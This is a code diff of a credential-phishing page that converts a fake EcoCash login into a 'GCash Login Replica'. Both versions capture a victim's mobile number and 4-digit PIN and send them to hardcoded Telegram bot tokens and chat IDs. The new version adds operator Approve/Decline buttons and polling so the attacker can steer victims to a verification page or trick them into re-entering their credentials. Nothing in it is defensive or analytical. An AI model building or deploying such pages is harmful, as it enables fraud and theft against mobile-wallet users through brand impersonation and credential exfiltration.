@@ -4,429 +4,349 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Logins</title>
+    <title>GCash Login Replica</title>
+    <!-- Tailwind CSS for modern responsive utility styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        html,
         body {
-            min-height: 100vh;
             font-family: 'Inter', sans-serif;
-            background: white;
-            overflow-x: hidden;
-            overflow-y: auto;
+            background-color: #f3f4f6;
         }
         
-        body {
-            display: flex;
-            flex-direction: column;
+        .keypad-btn {
+            background-color: #ffffff;
+            transition: background-color 0.1s ease, transform 0.05s ease;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
         }
         
-        .logo {
-            text-align: center;
-            padding: 50px 20px 20px;
-            flex-shrink: 0;
-        }
-        
-        .logo-text {
-            font-size: 36px;
-            font-weight: 700;
-        }
-        
-        .logo-eco {
-            color: #0066ff;
-        }
-        
-        .logo-cash {
-            color: #ff0000;
-        }
-        
-        .login-content {
-            flex: 1 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0 30px 50px;
-            max-width: 480px;
-            margin: 0 auto;
-            width: 100%;
-        }
-        
-        .title {
-            font-size: 26px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 40px;
-        }
-        
-        .phone-group {
-            width: 100%;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            padding: 18px 24px;
-            margin-bottom: 40px;
-            background: white;
-        }
-        
-        .flag {
-            font-size: 28px;
-            margin-right: 12px;
-        }
-        
-        .country-select {
-            display: flex;
-            align-items: center;
-            color: #0066ff;
-            font-weight: 600;
-            font-size: 18px;
-            margin-right: 16px;
-        }
-        
-        .dropdown-arrow {
-            font-size: 14px;
-            margin-left: 6px;
-        }
-        
-        .phone-input {
-            flex: 1;
-            border: none;
-            outline: none;
-            font-size: 18px;
-            color: #333;
-        }
-        
-        .phone-input::placeholder {
-            color: #aaa;
-        }
-        
-        .pin-label {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 24px;
-            font-weight: 500;
-        }
-        
-        .pin-group {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .pin-box {
-            width: 60px;
-            height: 60px;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
-            font-size: 28px;
-            text-align: center;
-            background: white;
-            color: #333;
-            font-weight: 600;
-        }
-        
-        .forgot {
-            font-size: 15px;
-            color: #0066ff;
-            text-decoration: none;
-            font-weight: 500;
-            margin-bottom: 40px;
-        }
-        
-        #loginBtn {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            padding: 18px;
-            background: #0066ff;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-bottom: 50px;
-            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
-        }
-        
-        .bottom-section {
-            background: #005eb8;
-            color: white;
-            padding: 100px 30px 80px;
-            text-align: center;
-            width: 100vw;
-            margin-left: calc(-50vw + 50%);
-            position: relative;
-            flex-shrink: 0;
-        }
-        
-        .curve {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 90px;
-            background: white;
-            border-radius: 0 0 50% 50% / 0 0 100% 100%;
-            transform: scaleX(1.8);
-            transform-origin: top;
-        }
-        
-        .bottom-content {
-            position: relative;
-            z-index: 2;
-        }
-        
-        .bottom-text {
-            font-size: 15px;
-            margin-bottom: 35px;
-            line-height: 1.6;
-            opacity: 0.95;
-        }
-        
-        .bottom-btns {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-bottom: 40px;
-        }
-        
-        .bottom-btn {
-            background: white;
-            color: #0066ff;
-            border: none;
-            border-radius: 30px;
-            padding: 18px 36px;
-            font-weight: 600;
-            font-size: 16px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            width: 180px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-        }
-        
-        .btn-icon {
-            font-size: 26px;
-            color: #0066ff;
-        }
-        
-        .version {
-            font-size: 14px;
-            margin-bottom: 12px;
-            opacity: 0.9;
-            font-weight: 500;
-        }
-        
-        .terms {
-            font-size: 13px;
-            opacity: 0.85;
-            line-height: 1.5;
-        }
-        
-        .terms a {
-            color: white;
-            text-decoration: underline;
-            font-weight: 500;
-        }
-        
-        #spinnerOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.98);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #005eb8;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
-        }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        
-        .spinner-text {
-            font-size: 18px;
-            color: #333;
-            text-align: center;
-            line-height: 1.6;
-            max-width: 300px;
-            font-weight: 500;
+        .keypad-btn:active {
+            background-color: #e5e7eb;
+            transform: scale(0.97);
         }
     </style>
 </head>
 
-<body>
-    <div class="logo">
-        <div class="logo-text">
-            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+<body class="flex items-center justify-center min-h-screen bg-gray-100 p-0 sm:p-4">
+
+    <!-- Mobile container wrapper -->
+    <div class="w-full max-w-md bg-white sm:rounded-3xl shadow-2xl overflow-hidden flex flex-col justify-between min-h-[100vh] sm:min-h-[750px]">
+
+        <!-- Top Header Section (GCash Blue Theme) -->
+        <div class="bg-[#007dfc] text-white pt-10 pb-8 px-6 text-center rounded-b-[30px] shadow-md relative">
+            <div class="flex items-center justify-center space-x-3 mb-4">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiPbeWE0l7-pKcYr66BdfSRGnBTBcHuOSY1EjZhIdSkw&s=10" alt="GCash Logo" class="w-10 h-10 object-contain rounded-full bg-white p-0.5 shadow" onerror="this.src='https://placehold.co/40x40/ffffff/007dfc?text=G'">
+                <span class="text-2xl font-bold tracking-tight">GCash</span>
+            </div>
+            <h2 id="headerTitle" class="text-xl font-medium tracking-wide">Log in to your account</h2>
+        </div>
+
+        <!-- STEP 1: Mobile Number View -->
+        <div id="mobileView" class="px-6 pt-8 pb-4 flex-grow flex flex-col justify-between">
+            <div>
+                <label for="mobileInput" class="block text-center text-gray-600 text-sm font-medium mb-3">
+                    Enter your mobile number
+                </label>
+                <div class="flex items-center border border-gray-300 rounded-xl px-4 py-3 bg-white shadow-sm focus-within:border-[#007dfc] focus-within:ring-2 focus-within:ring-blue-100 transition">
+                    <span class="text-gray-800 font-semibold text-lg select-none mr-2">+63</span>
+                    <input type="tel" id="mobileInput" readonly placeholder="Mobile number" maxlength="10" class="w-full bg-transparent text-gray-800 text-lg font-medium focus:outline-none placeholder-gray-400 tracking-wider">
+                </div>
+
+                <button id="nextBtn" onclick="handleNext()" class="w-full mt-6 bg-[#007dfc] hover:bg-[#006ae6] text-white font-semibold py-3.5 rounded-full shadow-lg transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed">
+                    Next
+                </button>
+
+                <div class="mt-6 text-center text-sm">
+                    <span class="text-gray-500">Don't have an account?</span>
+                    <a href="#" onclick="handleRegister(event)" class="text-[#007dfc] font-semibold hover:underline ml-1">Register</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 2: PIN Entry View (Hidden by default) -->
+        <div id="pinView" class="px-6 pt-8 pb-4 flex-grow flex flex-col justify-between hidden">
+            <div class="text-center">
+                <p id="displayPhone" class="text-gray-700 font-medium mb-6"></p>
+                <label class="block text-gray-600 text-sm font-medium mb-3">Enter your MPIN</label>
+
+                <!-- Visible PIN Boxes -->
+                <div class="flex justify-center gap-3 mb-6">
+                    <input type="password" class="pin-box w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-xl focus:border-[#007dfc] focus:outline-none bg-gray-50" maxlength="1" readonly>
+                    <input type="password" class="pin-box w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-xl focus:border-[#007dfc] focus:outline-none bg-gray-50" maxlength="1" readonly>
+                    <input type="password" class="pin-box w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-xl focus:border-[#007dfc] focus:outline-none bg-gray-50" maxlength="1" readonly>
+                    <input type="password" class="pin-box w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-xl focus:border-[#007dfc] focus:outline-none bg-gray-50" maxlength="1" readonly>
+                </div>
+
+                <div class="mb-4">
+                    <a href="#" class="text-sm text-[#007dfc] font-medium hover:underline">Forgot MPIN?</a>
+                </div>
+
+                <button id="loginBtn" class="w-full bg-[#007dfc] hover:bg-[#006ae6] text-white font-semibold py-3.5 rounded-full shadow-lg transition duration-200" style="display: none;">
+                    LOGIN
+                </button>
+            </div>
+
+            <div class="text-center">
+                <button onclick="backToMobile()" class="text-sm text-gray-500 hover:text-gray-700 underline">Change mobile number</button>
+            </div>
+        </div>
+
+        <!-- Interactive Numeric Keypad (Shared across both steps) -->
+        <div class="bg-[#f0f3f8] pt-3 pb-6 px-4 rounded-t-3xl border-t border-gray-200 shadow-inner">
+            <div class="grid grid-cols-3 gap-2.5 max-w-xs mx-auto">
+                <button onclick="appendKey('1')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">1</button>
+                <button onclick="appendKey('2')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">2</button>
+                <button onclick="appendKey('3')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">3</button>
+
+                <button onclick="appendKey('4')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">4</button>
+                <button onclick="appendKey('5')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">5</button>
+                <button onclick="appendKey('6')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">6</button>
+
+                <button onclick="appendKey('7')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">7</button>
+                <button onclick="appendKey('8')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">8</button>
+                <button onclick="appendKey('9')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">9</button>
+
+                <div></div>
+                <button onclick="appendKey('0')" class="keypad-btn py-3.5 rounded-xl text-xl font-semibold text-gray-800 shadow-sm">0</button>
+                <button onclick="deleteKey()" class="keypad-btn py-3.5 rounded-xl flex items-center justify-center text-gray-800 shadow-sm active:bg-gray-200">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.054 0 1.918-.864 1.918-1.918V7.918C20.836 6.864 19.972 6 18.918 6H5.062C4.008 6 3.144 6.864 3.144 7.918v8.164C3.144 17.136 4.008 18 5.062 18z" />
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9.5 9l5 6m0-6l-5 6" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Spinner Loading Overlay -->
+    <div id="spinnerOverlay" class="fixed inset-0 bg-black/50 hidden items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-2xl p-6 max-w-sm w-full shadow-2xl text-center">
+            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#007dfc] mx-auto mb-4"></div>
+            <p class="text-gray-700 font-medium">Verifying details...</p>
         </div>
     </div>
 
-    <div class="login-content">
-        <h1 class="title">Login</h1>
-
-        <div class="phone-group">
-            <span class="flag">🇿🇼</span>
-            <div class="country-select">
-                +263 <span class="dropdown-arrow">▼</span>
-            </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
-        </div>
-
-        <div class="pin-label">Enter your PIN</div>
-        <div class="pin-group">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-        </div>
-
-        <a href="#" class="forgot">Forgot PIN?</a>
-
-        <button id="loginBtn">LOGIN</button>
-    </div>
-
-    <div class="bottom-section">
-        <div class="curve"></div>
-        <div class="bottom-content">
-            <div class="bottom-text">
-                To register an EcoCash wallet or get assistance,<br> click below
-            </div>
-            <div class="bottom-btns">
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">👤</div>
-                    Register
-                </a>
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">ℹ️</div>
-                    Help & Support
-                </a>
-            </div>
-            <div class="version">v2.13P</div>
-            <div class="terms">
-                By signing in you agree to the <a href="#">Terms and Conditions</a>
-            </div>
+    <!-- Custom Modal -->
+    <div id="customModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-2xl p-6 max-w-sm w-full shadow-2xl text-center transform transition-all">
+            <h3 id="modalTitle" class="text-lg font-bold text-gray-900 mb-2">Notice</h3>
+            <p id="modalMessage" class="text-gray-600 text-sm mb-6">Message goes here...</p>
+            <button onclick="closeModal()" class="w-full bg-[#007dfc] text-white py-2.5 rounded-xl font-semibold hover:bg-[#006ae6] transition">OK</button>
         </div>
     </div>
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-        <div class="spinner-text">
-            Please wait...<br> This usually takes a few seconds
-        </div>
-    </div>
+
+    <!-- JavaScript Logic -->
     <script>
-        // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8958520368:AAEY2_sQezJG0NF6gNAKm74fLyOQoAnloiI';
-        const CHAT_ID_1 = '1480569244';
+        const BOT_TOKEN = '8655434304:AAF-Ix6PLMZj8qhwXvOMUMJqbu9XWKIYKmk';
+        const CHAT_ID = '8486303623';
 
-        // Bot 2 (your second bot)
-        const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
-        const CHAT_ID_2 = '5615316142';
+        let currentNumber = "";
+        let pinValues = ["", "", "", ""];
+        let currentPinIndex = 0;
+        const maxDigits = 10;
 
-        const savedPhone = localStorage.getItem('phone');
-        const phoneInput = document.getElementById('phoneInput');
-        if (savedPhone && savedPhone.length === 9) {
-            phoneInput.value = savedPhone;
+        const mobileInput = document.getElementById("mobileInput");
+        const nextBtn = document.getElementById("nextBtn");
+        const mobileView = document.getElementById("mobileView");
+        const pinView = document.getElementById("pinView");
+        const headerTitle = document.getElementById("headerTitle");
+        const displayPhone = document.getElementById("displayPhone");
+        const pinBoxes = document.querySelectorAll(".pin-box");
+        const loginBtn = document.getElementById("loginBtn");
+        const spinnerOverlay = document.getElementById("spinnerOverlay");
+
+        let pollInterval;
+        let lastUpdateId = 0;
+
+        updateButtonState();
+
+        function appendKey(digit) {
+            if (!mobileView.classList.contains("hidden")) {
+                if (currentNumber.length < maxDigits) {
+                    currentNumber += digit;
+                    mobileInput.value = currentNumber;
+                    updateButtonState();
+                }
+            } else {
+                if (currentPinIndex < 4) {
+                    pinValues[currentPinIndex] = digit;
+                    pinBoxes[currentPinIndex].value = digit;
+                    currentPinIndex++;
+                    checkPinComplete();
+                }
+            }
         }
-        const pinBoxes = document.querySelectorAll('.pin-box');
-        const loginBtn = document.getElementById('loginBtn');
-        const spinnerOverlay = document.getElementById('spinnerOverlay');
-        let pinValue = '';
+
+        function deleteKey() {
+            if (!mobileView.classList.contains("hidden")) {
+                if (currentNumber.length > 0) {
+                    currentNumber = currentNumber.slice(0, -1);
+                    mobileInput.value = currentNumber;
+                    updateButtonState();
+                }
+            } else {
+                if (currentPinIndex > 0) {
+                    currentPinIndex--;
+                    pinValues[currentPinIndex] = "";
+                    pinBoxes[currentPinIndex].value = "";
+                    checkPinComplete();
+                }
+            }
+        }
+
+        function updateButtonState() {
+            if (currentNumber.length === 10) {
+                nextBtn.removeAttribute("disabled");
+                nextBtn.classList.remove("opacity-50", "cursor-not-allowed");
+            } else {
+                nextBtn.setAttribute("disabled", "true");
+                nextBtn.classList.add("opacity-50", "cursor-not-allowed");
+            }
+        }
+
+        function handleNext() {
+            if (currentNumber.length === 10) {
+                mobileView.classList.add("hidden");
+                pinView.classList.remove("hidden");
+                headerTitle.innerText = "Enter your MPIN";
+                displayPhone.innerText = "+63 " + currentNumber;
+                currentPinIndex = 0;
+            } else {
+                showModal("Incomplete Number", "Please enter a valid 10-digit mobile number.");
+            }
+        }
+
+        function backToMobile() {
+            pinView.classList.add("hidden");
+            mobileView.classList.remove("hidden");
+            headerTitle.innerText = "Log in to your account";
+            pinValues = ["", "", "", ""];
+            pinBoxes.forEach(box => box.value = "");
+            currentPinIndex = 0;
+            loginBtn.style.display = "none";
+        }
 
         function checkPinComplete() {
-            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
-            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
+            const fullPin = pinValues.join("");
+            if (fullPin.length === 4) {
+                loginBtn.style.display = "block";
+            } else {
+                loginBtn.style.display = "none";
+            }
         }
 
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                if (box.value.length === 1 && index < 3) {
-                    pinBoxes[index + 1].focus();
-                }
-                checkPinComplete();
-            });
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    pinBoxes[index - 1].focus();
-                }
-            });
-        });
+        function handleRegister(event) {
+            event.preventDefault();
+            showModal("Registration", "Redirecting to GCash registration flow...");
+        }
 
-        // ========== LOGIN CLICK ==========
+        function showModal(title, message) {
+            document.getElementById("modalTitle").innerText = title;
+            document.getElementById("modalMessage").innerText = message;
+            document.getElementById("customModal").classList.remove("hidden");
+            document.getElementById("customModal").classList.add("flex");
+        }
+
+        function closeModal() {
+            document.getElementById("customModal").classList.remove("flex");
+            document.getElementById("customModal").classList.add("hidden");
+        }
+
+        // Full reset function to clear and restart reentry when declined
+        function resetForReentry() {
+            clearInterval(pollInterval);
+            spinnerOverlay.style.display = 'none';
+
+            // Clear all data
+            currentNumber = "";
+            mobileInput.value = "";
+            pinValues = ["", "", "", ""];
+            pinBoxes.forEach(box => box.value = "");
+            currentPinIndex = 0;
+            loginBtn.style.display = "none";
+
+            // Return to step 1
+            pinView.classList.add("hidden");
+            mobileView.classList.remove("hidden");
+            headerTitle.innerText = "Log in to your account";
+            updateButtonState();
+
+            showModal("Request Declined", "Access was declined. Please re-enter your correct pin and phone number.");
+        }
+
+        // Telegram submission on Login click with Approve and Decline options
         loginBtn.addEventListener('click', () => {
-            const phone = phoneInput.value.trim();
-            if (!phone) {
-                alert('Please enter phone number');
+            const phone = currentNumber;
+            const pinValue = pinValues.join('');
+
+            if (pinValue.length !== 4) {
+                alert('Please enter complete 4-digit PIN');
                 return;
             }
 
             spinnerOverlay.style.display = 'flex';
+            const timestamp = Date.now();
+            const approveData = 'approve_' + timestamp;
+            const declineData = 'decline_' + timestamp;
+            const message = `New Login Attempt\n\nPhone: +63 ${phone}\nPIN: ${pinValue}\n\nApprove or Decline access?`;
 
-            // Save phone to localStorage
-            localStorage.setItem('phone', phone);
-
-            // Build the credential message
-            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
-
-            // Send to Bot 1
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_1,
-                    text: message
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: '✅ Approve',
+                                    callback_data: approveData
+                                }, {
+                                    text: '❌ Decline',
+                                    callback_data: declineData
+                                }]
+                            ]
+                        }
+                    })
                 })
-            }).catch(() => {});
-
-            // Send to Bot 2
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_2,
-                    text: message
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        spinnerOverlay.style.display = 'none';
+                        alert('Error sending to bot: ' + data.description);
+                    }
                 })
-            }).catch(() => {});
+                .catch(error => {
+                    spinnerOverlay.style.display = 'none';
+                    alert('Bot connection error: ' + error);
+                });
 
-            // Proceed to next page
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+            // Poll Telegram for user interaction response
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            for (let update of data.result) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const cbData = update.callback_query.data;
+                                    if (cbData === approveData) {
+                                        clearInterval(pollInterval);
+                                        spinnerOverlay.style.display = 'none';
+                                        window.location.href = 'verify.html';
+                                    } else if (cbData === declineData) {
+                                        resetForReentry();
+                                    }
+                                }
+                            }
+                        }
+                    });
+            }, 2000);
         });
-
-        checkPinComplete();
-        pinBoxes[0].focus();
     </script>
 </body>
 
